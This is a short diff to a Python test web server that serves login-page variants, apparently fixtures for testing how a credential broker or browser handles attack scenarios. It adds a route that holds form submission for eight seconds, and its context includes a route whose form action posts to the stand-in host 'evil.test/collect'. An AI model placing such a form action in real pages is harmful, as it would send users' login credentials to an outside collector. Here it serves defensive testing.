@@ -135,6 +135,10 @@ class Handler(BaseHTTPRequestHandler):
             # submit is held for 3 s (lets the V17 negative control's attacker attach before the POST)
             return self._send(200, login_page(script="f.addEventListener('submit', e => { e.preventDefault(); "
                                                      "setTimeout(() => f.submit(), 3000); });"))
+        if path == "/login-hold-long":
+            # submit held for 8 s: the lock cell locks the broker while the filled form is still on the page
+            return self._send(200, login_page(script="f.addEventListener('submit', e => { e.preventDefault(); "
+                                                     "setTimeout(() => f.submit(), 8000); });"))
         if path == "/login-formaction":
             return self._send(200, login_page(action="https://evil.test/collect"))
         if path == "/login-buttonaction":
